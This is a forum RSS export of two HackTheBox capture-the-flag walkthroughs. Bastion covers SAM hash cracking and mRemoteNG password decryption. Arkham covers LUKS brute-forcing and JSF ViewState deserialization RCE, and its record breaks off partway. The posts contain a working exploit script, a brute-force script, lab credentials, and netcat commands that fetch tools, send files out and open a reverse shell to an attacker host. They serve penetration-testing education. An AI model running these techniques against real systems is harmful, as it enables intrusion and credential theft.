<p>Bastion proved to be a very easy yet pretty fun challenge, quite unique in its kind even if it doesn’t present any particular difficulties, all one needs to complete this box is a search engine to learn how to accomplish certain tasks, all of which only take a couple minutes to solve, hence why so many people finished this box despite it not being one of those two clicks to root kind of boxes (I’m looking at you, Blue, Jerry, Lame, etc…). The first half of the challenge involves finding a Windows backup containing an old copy of the SAM database, which when read gives us SSH credentials to log in the box. Once inside the administrator’s password must be extracted and decrypted from the saved settings of a remote sessions manager.</p>
<hr>
<h2>Drawing the perimeter</h2>
<p>I begin by scanning the box with a standard service scan (-sV) and executing the default list of NSE scripts (-sC), and one of the first things one can notice is that nmap found guest login available on SMB:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2ae560eb4fcdd041708ab50d46a6d58352111f77.png" alt="image" data-base62-sha1="67tuHfAKCdo76i3tCXvOqX2Slzp" width="537" height="500"></p>
<p>We can use this access to list the available shares:</p>
<pre><code class="lang-auto">$ smbclient -L 10.10.10.134
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/595fdf0c1b7e8b95b4a006e18c0115938d27391e.png" alt="image" data-base62-sha1="cKDTGr9zxU3pKXSQJNRmu9146js" width="655" height="226"></p>
<p>Backups seems to be the only unprotected share on the system so let’s access it and see what’s inside:</p>
<pre><code class="lang-auto">$ smbclient \\\\10.10.10.134\\Backups
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/317bcb02068ce4254de5ad4e97b152a3d376c344.png" alt="image" data-base62-sha1="73KCwotc8ALYtcSBy0Pn92Pdnrm" width="631" height="500"></p>
<p>This whole share contains a Windows backup, in fact if we go further in the directory tree we reach two <em>.vhd</em> (Virtual Hard Drive) files, which contain the whole backed up disk:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b37732c3478a82c816e17b9d4bc3eb467e5d4433.png" alt="image" data-base62-sha1="pBCQB9cslcrkENGTcASBIasTqev" width="628" height="90"></p>
<p>One of these files is very big though so downloading it isn’t very convenient, also we found a <em>note.txt</em> file on the root of the share which gives us a very clear hint on what we shouldn’t be doing:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/99235f90755626e3f56909a8105eec5c3bad3320.png" alt="image" data-base62-sha1="lQIQ4Euz6A1r3D1EjYsZYmPlK4E" width="651" height="81"></p>
<p>But there is a solution to this problem. I’m going to mount this share on my own system and then mount the vhd files from there, giving me access to their content without having to download the whole huge file locally. We need to install two additional tools for this task:</p>
<pre><code class="lang-auto">$ sudo apt-get install cifs-utils
$ sudo apt-get install libguestfs-tools
</code></pre>
<p>Then we mount the share on our computer:</p>
<pre><code class="lang-auto">$ mount -t cifs //10.10.10.134/Backups /mnt/remote -o rw
</code></pre>
<p>So now we can access the share from /mnt/remote:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b05fd1f2ad49f3922c6535cc91542a3148cea26f.png" alt="image" data-base62-sha1="pahkmvxGoZ24c0ANB9hkaiKyZTp" width="442" height="156"></p>
<p>Once navigated to the folder where the two .vhd files reside we can mount them on our disk with guestmount:</p>
<pre><code class="lang-auto">$ guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd -v
</code></pre>
<p>So we have the whole disk at our disposal now!</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9769a0889e1b2968340e8358ee62dd41478e4661.png" alt="image" data-base62-sha1="lBsoZdDJdS2RoqjikMkESvW38NX" width="655" height="288"></p>
<hr>
<h2>Stealing user credentials from the SAM file</h2>
<p>The Users folder does not contain any flags and really there are only two truly interesting files in the whole backup, those two being SAM and SYSTEM: SAM is where Windows stores user passwords in an encrypted form, SYSTEM is where the encryption key for these passwords is located, so with these two files at hand we can get the credentials of the users. These files are stored in <em>/mnt/vhd/Windows/System32/config/</em> :</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/848f0380cf6aa4b36e9e29fd1292dcb878ef9ab6.png" alt="image" data-base62-sha1="iUFqKHDn9A4KUatI5r8GrSdg0CO" width="415" height="300"></p>
<p>We can list the users of which the crentials are stored in the SAM file using <em>chntpw</em> however if we mounted the virtual disk on a read-only mount we have to copy the file in a different folder first:</p>
<pre><code class="lang-auto">$ chntpw -l SAM
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6ef1cf8668a739550ce597f4e4853fcae1488e60.png" alt="image" data-base62-sha1="fPsB7gVBYzT20Ojqh40zXFl5tHW" width="480" height="214"></p>
<p>The Administrator and Guest accounts appear to be disabled so we cannot retrieve the administrator’s password, however L4mpje isn’t, so we can dump its hash and crack it with hashcat. First we use <em>samdump2</em> to create a text file containing all the hashes:</p>
<pre><code class="lang-auto">$ samdump2 ./SYSTEM ./SAM &gt; /home/baud/bastion/hash.txt
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a35426e6433260d35e08649992dab4c023b6ebbb.png" alt="image" data-base62-sha1="niS7AwXpIY720Fg7pWRSulQaDq3" width="649" height="122"></p>
<p>The last field is the hashed password, hashed in NTLM. In order for hashcat to crack it we need it to be all uppercase so we can do this with awk:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/12327e5667fbc71c0f3c572bf788e86cda58f435.png" alt="image" data-base62-sha1="2AYM87ngquLUEUqblIlAqsC0dj7" width="621" height="141"></p>
<p>Once we have the file with the correct hash in it we can use hashcat for a dictionary attack to crack it, I’m going to use the classic <em>rockyou.txt</em> wordlist, which is pretty much always sure to hit the target in CTF challenges:</p>
<pre><code class="lang-auto">$ hashcat -m 1000 -a 0 hashcat.txt rockyou.txt --force
</code></pre>
<p><strong>-m 1000</strong> tells hashcat what hash type we’re cracking, NTLMv2 in our case, and <strong>-a 0</strong> tells it to perform a dictionary attack. –force will run the attack despite hashcat not recognizing what hardware is installed on the computer, since I’m using a VM (installed on a bad laptop, I should add). In just a few seconds we get the results back and the password has been found:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/baa8973e2b49a0e265d28098ed18b3c70d1282f0.png" alt="image" data-base62-sha1="qDg0QjIPWQ53ybvt5AWXGpFVXTa" width="528" height="363"></p>
<p>So now we have a pair of working credentials that we can use to login using the SSH service running on the box:</p>
<pre><code class="lang-auto">User: L4mpje
Pass: bureaulampje
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6629915b06a3f7860cfe9fc5ce81ede902c9c4c1.png" alt="image" data-base62-sha1="ezLL9ECBQdrMI2nW3oo3oSXQaZ3" width="424" height="409"></p>
<p>And thanks to this we can grab the user.txt flag from our current user’s desktop:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d2054386a6c9f5b65c1791a5b4f47ca447826fc7.png" alt="image" data-base62-sha1="tXVxSgSbyWlUnWAvKN8uhpJPIQD" width="380" height="38"></p>
<p>Looking at the installed programs shows something interesting, mRemoteNG is present on the system, which is a program that can manage remote sessions using a variety of protocols such as RDP, VNC, and many more:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d27d5d2e306eafcfcc0651c27e3f461c7fd866d5.png" alt="image" data-base62-sha1="u24Rjrdh38LFI8nlP29t0QzrHbD" width="478" height="346"></p>
<p>It takes only a few seconds of Googling to find out that mRemoteNG saves the settings of its managed connections locally, these settings also include user passwords given to the program for the establishment of a connection, and there already exist plenty of scripts that are able to decrypt these passwords from their encrypted form. To be more specific, this is how the passwords are stored in encypted form by mRemoteNG:</p>
<pre><code class="lang-auto">encrypted_pass = base64(IV + AES-128-CBC(cleartext_pass, md5(mR3m), IV))
</code></pre>
<hr>
<h2>Privilege escalation: decrypting stored mRemoteNG passwords</h2>
<p>All the passwords are stored in a file called confCons.xml which can be found at <em>%appdata%\mRemoteNG</em>:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/ab89e6718a43dcb4793e0ce4b47ce0c2872ebfda.png" alt="image" data-base62-sha1="otv61D5V8biWQcLGeiEiN167Msa" width="605" height="387"></p>
<p>The file can be downloaded on our own box using <em>nc.exe</em> (or just use <em>net use</em> to enable a local share, whatever you prefer), first nc.exe is downloaded on Bastion:</p>
<pre><code class="lang-auto">$ powershell Invoke-WebRequest http://10.10.14.29:8080/nc.exe -OutFile ./nc.exe
</code></pre>
<p>Then we set up a netcat listener on our box:</p>
<pre><code class="lang-auto">$ nc -lvp 9999 &gt; confCons.xml
</code></pre>
<p>And then we send the file from Bastion:</p>
<pre><code class="lang-auto">$ nc -w 3 10.10.14.29 9999 &lt; %appdata%\mRemoteNG\confCons.xml
</code></pre>
<p>Once the file is transferred we can open it to see its content and we can notice that one of the saved sessions belongs to the Administrator account:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/22fe27bb05d725ff9bdc7203ea29114852b859ab.png" alt="image" data-base62-sha1="4ZyL3zEO828EfMwui84FRZNSCaD" width="587" height="318"></p>
<p>Now it’s time to decrypt this password. I’m going to use <a href="https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py" rel="noopener nofollow ugc">this</a> Python script from Github but there even is a Metasploit module to do so if one is already running a meterpreter session, which isn’t my case unfortunately:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5c8b6753e83342049508399bb0ad14001cb42435.png" alt="image" data-base62-sha1="dcGB5mhEUiOdg4iJz21Amy6nKiV" width="690" height="210"></p>
<p>So now we have the administrator’s credentials too!</p>
<pre><code class="lang-auto">User: Administrator
Pass: thXLHM96BeKL0ER2
</code></pre>
<p>We can use these to login using good old SSH and complete the box by grabbing the root flag:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/ab51a7df1c14bf740b806bb2d44293b7d95cfd21.png" alt="image" data-base62-sha1="oryAPDYpnmhBrnxtvT0XyNNmXNn" width="479" height="117"></p>
<p>And Bastion is done. Allow me to make a bit of shameless self promotion at the end of this post, if you read this far and would like to see more writeups maybe for boxes that have been retired for a while I am posting some of mine on my new <a href="https://offsecdeer.gitlab.io/" rel="noopener nofollow ugc">blog</a>, writeups won’t be my only focus but I already have a bunch over there so go take a look if you’re interested, I upload new ones as soon as I can so they’ll keep on growing. Also the blog is still very WIP so I apologize if the theme is bad and if it looks like shit from phones, I’ll get to it, one step at a time.</p>
<p>&lt;/shameless_self_promotion&gt;</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/hackthebox-writeup-bastion/16095">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/hackthebox-writeup-bastion/16095</link>
          <pubDate>Sun, 08 Sep 2019 02:23:45 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-16095</guid>
          <source url="https://0x00sec.org/t/hackthebox-writeup-bastion/16095.rss">HackTheBox Writeup: Bastion</source>
        </item>
        <item>
          <title>HackTheBox Writeup: Arkham</title>
          <dc:creator><![CDATA[Baud]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/11eaeec32b8610728fa51dbf24560f2be789aa48.png" alt="image" data-base62-sha1="2yvsodiEz4fdMX6se6loVKZsFWE" width="598" height="378"><br>
Arkham is one of my favorite boxes on HTB and it just got retired, I personally wouldn’t have rated it as Medium but maybe it’s just because it’s the hardest Windows box I have faced so far, and it proved to be a lot of fun and a good way to learn more about Windows internals and post exploitation. Keep in mind that this is going to be a rather long writeup as I like showing all the steps and the thought process behind them. That being said, let’s start from the very beginning: enumeration.</p>
<hr>
<p><strong>Drawing the perimeter</strong></p>
<p>The usual basic nmap scan with service enumeration (-sV) and execution of default NSE scripts (-sC) on all ports (-p-) returns a few ports that may be of our interest:</p>
<pre><code>┌─[baud@parrot]─[~/arkham]
└──╼ $sudo nmap -sC -sV -p- -oA nmap 10.10.10.130
[sudo] password di baud:
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-07 19:19 CEST
Nmap scan report for 10.10.10.130
Host is up (0.025s latency).
Not shown: 65528 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
8080/tcp  open  http          Apache Tomcat 8.5.37
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Mask Inc.
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -27s, deviation: 0s, median: -27s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-08-07 19:21:44
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.66 seconds
</code></pre>
<p>First of all, from the version of IIS running on port 80 (IIS 10.0) we can already tell we are dealing with either Windows Server 2016 or Windows 10, and opening the address <a href="http://10.10.10.130/" rel="noopener nofollow ugc">http://10.10.10.130</a> on a browser shows a default unalterated installation of IIS:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6260c4912a2db4cfbbab4f7d7a54175f03801647.png" alt="image" data-base62-sha1="e2i7cQsXNHIoavAPV76VmkNJD6f" width="690" height="486"><br>
Running gobuster with a big dictionary doesn’t return any results either so better focus somewhere else.</p>
<pre><code>┌─[✗]─[baud@parrot]─[~/arkham]
└──╼ $gobuster dir -w ../SecLists/Discovery/Web-Content/big.txt -t 50 -u http://10.10.10.130
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.130
[+] Threads:        50
[+] Wordlist:       ../SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/08/08 17:12:31 Starting gobuster
===============================================================
===============================================================
2019/08/08 17:12:46 Finished
===============================================================
</code></pre>
<p>For example, there’s a second web server running on port 8080, this time it’s an Apache Tomcat server and there’s an actual custom website:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/66273c6743fcf0394df6da340b90b2aa4f8f0d55.jpeg" alt="image" data-base62-sha1="ezGLpcX02Y3jpaUy3oSnZb3WBRH" width="690" height="487"><br>
The website seems to be advertising a service called “Masks”, name which is actually a hint on the technology behind this web application, in fact the only functional button on the website is the “Subscription” button, which redirects to this URL:</p>
<pre><code>http://10.10.10.130:8080/userSubscribe.faces
</code></pre>
<p>The .faces extension tells us this page relies on the Java Server Faces framework (JFS), possibly the Apache MyFaces implementation since this is an Apache server. JFS is a framework used to design web-based user interfaces, and on this site it’s used to handle this simple subscription form:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c9fd5d2a6b9c1d2c599a7cc7322b1a093fd0ffa1.png" alt="image" data-base62-sha1="sOSNG5WvnfsDsFObYhhf3TyeZHP" width="645" height="413"><br>
The button generates a POST request to the same page, sending the server not only the address we provide, but also a hidden input field that was in the HTML code, called “javax.faces.ViewState”:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c6ee0960e32b6ecaaf08eea5bb005acc4067eefe.png" alt="image" data-base62-sha1="snOwSq8pYECwWs6UdwMrzv4uHzE" width="690" height="135"><br>
With a little <a href="https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html" rel="noopener nofollow ugc">research</a> I discover that ViewState is a variable used by JFS to determine what components are supposed to be displayed on the page, and it’s actually a serialized Java object which when not configured correctly can lead to RCE vulnerabilities. Because some implementations of JSF didn’t encrypt or sign this ViewState string it is possible for an attacker to craft a malicious serialized Java object to send in place of the original, this object can use the Java gadgets available to the application to execute code.</p>
<p>Unfortunately for us, Apache MyFaces enables ViewState encryption by default using DES/ECB/PKCS5 Padding and even an SHA1 HMAC with a secret key to verify the validity of the data before it is decrypted server-side. If you’re interested in knowing how all this works you’ll find some Java pseudo-code later in this writeup or you can consult <a href="https://www.programcreek.com/java-api-examples/?code=apache/myfaces-trinidad/myfaces-trinidad-master/trinidad-impl/src/main/java/org/apache/myfaces/trinidadinternal/util/StateUtils.java" rel="noopener nofollow ugc">the actual source code</a> responsible for encryption and decryption of the serialized object. Let’s leave all this information on hold for some time and continue exploring the box.</p>
<p>All gobuster can find on this second web server is a bunch of resource folders that we cannot list:</p>
<pre><code>/css
/favicons
/fonts
/images
/js
</code></pre>
<p>And excluding the two RPC ports I saved the most interesting one for last: SMB. Let’s list the available shares using smbclient:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/60347d1a14a0a5d955ee0db6719b9c11fa2fc33b.png" alt="image" data-base62-sha1="dJ4icKyp7HFDOHyWw0aZAT5HoCf" width="645" height="226"><br>
Despite it containing “secrets” the BatShare folder is accessible without authentication and it contains a .zip file:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3fdb6fc7a26b0abaa52de5a9a9236062736d51c9.png" alt="image" data-base62-sha1="96UdJkL07MFbCZJ5g9EFuA40d7z" width="690" height="176"></p>
<pre><code>smb: \&gt; get appserver.zip
getting file \appserver.zip of size 4046695 as appserver.zip (1415,4 KiloBytes/sec) (average 1415,4 KiloBytes/sec)
smb: \&gt; exit
┌─[baud@parrot]─[~]
└──╼ $file appserver.zip
appserver.zip: Zip archive data, at least v2.0 to extract
┌─[baud@parrot]─[~]
└──╼ $mv appserver.zip arkham/
┌─[baud@parrot]─[~]
└──╼ $cd arkham
┌─[baud@parrot]─[~/arkham]
└──╼ $unzip appserver.zip
Archive:  appserver.zip
  inflating: IMPORTANT.txt           
  inflating: backup.img              
</code></pre>
<p>The IMPORTANT.txt file contains a note for Alfred from Bruce, anticipating us that backup.img is password protected:</p>
<pre><code>Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce
</code></pre>
<p>Now it’s time for some trial and error. The easiest way to go past this obstacle is creating a subset of a big dictionary containing only Batman-related passwords to make our lives easier, I’m going to use rockyou.txt:</p>
<pre><code>$ cat /usr/share/wordlists/rockyou.txt | egrep 'batman|robin|alfred|joker|scarecrow|gotham' &gt; wordlist.txt
</code></pre>
<p>This command creates a new wordlist with all the entries in rockyou.txt that contain the specified Batman-related words. This returns less than 6000 passwords, much less than having to deal with the whole huge original dictionary:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/699f89e50a6ca25aa8c0dc83fc994901f92bba05.png" alt="image" data-base62-sha1="f4nWycnVKfiNrdzlF8sXAsZy84J" width="459" height="85"><br>
Because these are still a lot of passwords it’s necessary to automate the password guessing process. First let’s check what kind of image file we are dealing with:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7cdde08ac25728779eade1fb8999ef4dcac21904.png" alt="image" data-base62-sha1="hOCzHDfTTXbkkQSaNAt5DykLiF6" width="690" height="61"><br>
Because it’s a LUKS file we can use the cryptsetup utility to work with it, and it comes really handy that it supports an option to verify passwords:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7f5e6dd4b696844417ab7e58051e3499ca26cd50.png" alt="image" data-base62-sha1="iaKX1vhzfj7pjLnAihjuU5wVmP6" width="690" height="139"><br>
Thanks to this a simple bash script can be written to bruteforce the file:</p>
<pre><code class="lang-bash"># read a line from the wordlist
cat wordlist.txt | while read i; do
        echo -ne "\rTrying: \"$i\""\\r
        # pass the current password attempt to cryptsetup (the .img file is passed from stdin)
        echo $i | cryptsetup luksOpen $1 x --test-passphrase -T1 2&gt;/dev/null
        # grab cryptsetup's exit code
        STATUS=$?
        # was the operation successful?
        if [ $STATUS -eq 0 ]; then
                echo -e "\nPASSWORD FOUND: \"$i\""
                break
        fi
   done
</code></pre>
<p>The script is a little slow but it does the job and the password is found:</p>
<pre><code>┌─[root@parrot]─[/home/baud/arkham]
└──╼ #./luksBrute.sh backup.img
Trying: "batman"
Trying: "alfredo"
Trying: "alfred"
Trying: "robinson"
Trying: "batman1"
Trying: "joker"
Trying: "robin"
[....]
PASSWORD FOUND: "batmanforever"
</code></pre>
<p>cryptsetup automatically mapped the image file on to /dev/mapper/x so it needs to be mounted:</p>
<pre><code>┌─[root@parrot]─[/home/baud/arkham]
└──╼ # mkdir /mnt/arkham
┌─[root@parrot]─[/home/baud/arkham]
└──╼ # mount /dev/mapper/x /mnt/arkham
┌─[root@parrot]─[/home/baud/arkham]
└──╼ # ls -la /mnt/arkham/
totale 14
drwxr-xr-x 4 root root  1024 dic 25  2018 .
drwxr-xr-x 1 root root    38 ago  7 19:23 ..
drwx------ 2 root root 12288 dic 25  2018 lost+found
drwxrwxr-x 4 root root  1024 dic 25  2018 Mask
</code></pre>
<p>lost+found is empty but Mask contains MyFaces configuration files, other than a few random images which don’t contain anything interesting and have nothing to hide:</p>
<pre><code>┌─[root@parrot]─[/mnt/arkham]
└──╼ #ls -ls Mask
totale 880
  1 drwxr-xr-x 2 root root   1024 dic 25  2018 docs
95 -rw-rw-r-- 1 root root  96978 dic 25  2018 joker.png
103 -rw-rw-r-- 1 root root 105374 dic 25  2018 me.jpg
672 -rw-rw-r-- 1 root root 687160 dic 25  2018 mycar.jpg
  8 -rw-rw-r-- 1 root root   7586 dic 25  2018 robin.jpeg
  1 drwxr-xr-x 2 root root   1024 dic 25  2018 tomcat-stuff
┌─[root@parrot]─[/mnt/arkham]
└──╼ #ls -la Mask/tomcat-stuff
totale 193
drwxr-xr-x 2 root root   1024 dic 25  2018 .
drwxrwxr-x 4 root root   1024 dic 25  2018 ..
-rw-r--r-- 1 root root   1368 dic 25  2018 context.xml
-rw-r--r-- 1 root root    832 dic 25  2018 faces-config.xml
-rw-r--r-- 1 root root   1172 dic 25  2018 jaspic-providers.xml
-rw-r--r-- 1 root root     39 dic 25  2018 MANIFEST.MF
-rw-r--r-- 1 root root   7678 dic 25  2018 server.xml
-rw-r--r-- 1 root root   2208 dic 25  2018 tomcat-users.xml
-rw-r--r-- 1 root root 174021 dic 25  2018 web.xml
-rw-r--r-- 1 root root   3498 dic 25  2018 web.xml.bak
</code></pre>
<p>If you’re wondering, docs contains the scripts of Batman Begins. Confused? So am I. But here’s something very interesting to break the confusion, by taking a look at the configuration files I discover the encryption settings used by the server:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9927d49ba322e4696b7899fb31bb43a9ddb15950.png" alt="image" data-base62-sha1="lQSo8YjQ3sEStnnLDPnlGIpx8pq" width="690" height="451"><br>
Now that I know the secret keys used by the web application to encrypt and decrypt the ViewState object I can send my own malicious objects to achieve RCE.</p>
<hr>
<p><strong>A bit of cryptography</strong></p>
<p>I took a look at the MyFaces code to see how it works out of curiosity and altered it a bit to get rid of stuff I don’t need and to make it more readable, this is the function responsible for encrypting objects:</p>
<pre><code class="lang-java">public static byte[] encrypt(byte[] insecure, ExternalContext ctx)
{
    // no IV by default
    byte[] iv = null;
    // create the mac object
    Mac mac = Mac.getInstance("HmacSHA1");
    // give it the secret key
    mac.init("SnNGOTg3Ni0=");
    // declare the output cihper
    Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
    // initialize it with the secret key
    cipher.init(Cipher.ENCRYPT_MODE, "SnNGOTg3Ni0=");
    // SHA1 output = 20 bytes
    int macLenght = mac.getMacLength();
    // this array of bytes will contain the encrypted data. The mac is appeneded to it
    byte[] secure = new byte[cipher.getOutputSize(insecure.length) + macLenght];
    // encrypt data "insecure" and store the cipher in "secure"
    int secureCount = cipher.doFinal(insecure, 0, insecure.length, secure);
    // update the mac with the current params: source buffer, offset, amount of bytes
    mac.update(secure, 0, secureCount);
    // and then calculate it
    mac.doFinal(secure, secureCount);
    return secure;
}
</code></pre>
<p>And this one decrypts them:</p>
<pre><code class="lang-java">public static byte[] decrypt(byte[] secure, ExternalContext ctx)
{
    // no IV by default
    byte[] iv = null;
    // create the mac object
    Mac mac = Mac.getInstance("HmacSHA1");
    // give the object the secret key
    mac.init("SnNGOTg3Ni0=");
    // create a DES cipher for the decryption process
    Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
    // initialize the cipher for decryption with the secret key
    cipher.init(Cipher.DECRYPT_MODE, "SnNGOTg3Ni0=");
    // SHA1 output = 20 bytes
    int macLenght = mac.getMacLength();
    // calculate the mac from the received data
    mac.update(secure, 0, secure.length-macLenght);
    byte[] signedDigestHash = mac.doFinal();
    boolean isMacEqual = true;
    // check if the received mac has been calculated with the correct key
    for (int i = 0; i &lt; signedDigestHash.length; i++)
    {
        if (signedDigestHash[i] != secure[secure.length-macLenght+i])
        {
            isMacEqual = false;
        }
    }
    // if the two macs are equal the object is decrypted
    return cipher.doFinal(secure, 0, secure.length-macLenght);
}
</code></pre>
<p>The way it works is the serialized Java object is made of DES encrypted data with the HMAC used for verification appended at the end, it being the last 20 bytes. This structure is then encoded in Base64 and it’s what we saw earlier on Burp. The HMAC is used to calculate a message digest using the encrypted data and the secret key, when the server receives the ViewState object back it will first calculate a new HMAC from the data it received and the key stored in the settings, if it’s the same as the HMAC appended to the data then the data can be trusted and it is finally deserialized. Now that we have that secret key we can use it to calculate our own valid HMACs, allowing us to achieve RCE because our objects will look 100% legit.</p>
<hr>
<p><a name="exploitation" href="https://0x00sec.org"></a><br>
<strong>Exploitation: blind shell</strong></p>
<p>By exploiting this flaw we’ll be able to execute arbitrary Java gadgets that when chained together can perform several tasks, but because we’re not executing OS commands from the start we need a third party program to generate these chains for us and serialize them, for this purpose I downloaded <a href="https://github.com/frohoff/ysoserial" rel="noopener nofollow ugc">ysoserial</a> and used the CommonsCollections5 gadgets to execute cmd.exe on the system. ysoserial returns the serialized object on stdout so we can write a Python script that grabs the output from ysoserial and forwards it to the server after encrypting it properly and appending the correct HMAC to it:</p>
<pre><code class="lang-auto">import base64
import hashlib
import urllib
import hmac
import pyDes
import sys
import requests
import subprocess

# generate the serialized Java object
def getPayload(cmd):
    p = subprocess.Popen('java -jar /home/baud/arkham/ysoserial.jar CommonsCollections5 "'+cmd+'"', stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
    payload = p.stdout.read()

    # encrypt the object with DES
    secret = bytes(base64.b64decode("SnNGOTg3Ni0="))
    des_obj = pyDes.des(secret, pyDes.ECB, IV=None, padmode=pyDes.PAD_PKCS5)
    encrypted_payload = des_obj.encrypt(payload)

    # calculate the HMAC
    mac_obj = hmac.new(secret, encrypted_payload, hashlib.sha1)
    mac = mac_obj.digest()

    # return [encrypted_data + HMAC]
    out = base64.encodestring(encrypted_payload + mac)
    out = out.replace('\n', '').replace('\r', '')
    return out

# ask for the command to be executed
while True:
    cmd = raw_input("&gt; ")
    if cmd == 'exit':
        sys.exit(0)

    # send a POST request to the server with our newly crafted ViewState object
    url = "http://10.10.10.130:8080/userSubscribe.faces"
    cookies = {"JSESSIONID": "38D5C0F7EAC7A6F06299275C268986BB"}
    req_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"}
    req_data={"j_id_jsp_1623871077_1:email": "baudy@baud.com", "j_id_jsp_1623871077_1:submit": "SIGN UP", "j_id_jsp_1623871077_1_SUBMIT": "1"}
    data['javax.faces.ViewState'] = getPayload(cmd)
    r = requests.post(url, cookies=cookies, data=req_data, headers=req_headers)
</code></pre>
<p>This script gives us a blind shell on the box, we are able to execute any operation we want but it’s still uncomfortable, and blind, so to have a proper shell I downloaded nc.exe on the box using Invoke-WebReques after starting an HTTP server with PHP and opening a listener to welcome the incoming connection:</p>
<pre><code>┌─[root@parrot]─[/home/baud/server]
└──╼ # php -S 0.0.0.0:9090 -t .
┌─[root@parrot]─[/home/baud/arkham]
└──╼ # nc -lvnp 9999
</code></pre>
<p>And from the blind shell :</p>
<pre><code>&gt; powershell iwr http://10.10.14.29:9090/nc.exe -OutFile ./nc.exe
&gt; nc.exe -e cmd 10.10.14.29 9999
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d5e210a24a1b0a0b679a9f3b8ab154429019358e.png" alt="image" data-base62-sha1="uw62FZSOW8goyVlArTHIx3f3YwC" width="690" height="360"><br>
With this we finally have a shell as Alfred and can read our first flag, then it’s time for some local enumeration. Aside from Alfred and Administrator there’s another user on the system: Batman. Unfortunately his directory is out of our reach.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/fa917547edcfb0060934724df94567e03b7eefe6.png" alt="image" data-base62-sha1="zKD0DgK4EX18YrgOYDJqqjGEkxo" width="503" height="254"><br>
<strong>Horizontal privilege escalation</strong></p>
<p>Inside Alfred’s downloads directory there’s a backups folder containing a backup.zip file, because I’m lazy and meterpreter executables are immediately detected by an angry Defender I’m going to use nc.exe to transfer this file locally:</p>
<pre><code># On Arkham:
nc.exe 10.10.14.29 4444 &lt; c:\users\alfred\downloads\backups\backup.zip
# On local box:
nc -lvp 4444 &gt; backup.zip
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5d69a7cd9b6e315cfa5b93fc8d176fa584395f03.png" alt="image" data-base62-sha1="dkmLM5PgNc3s7BgeCVg1oC5J5u3" width="578" height="405"><br>
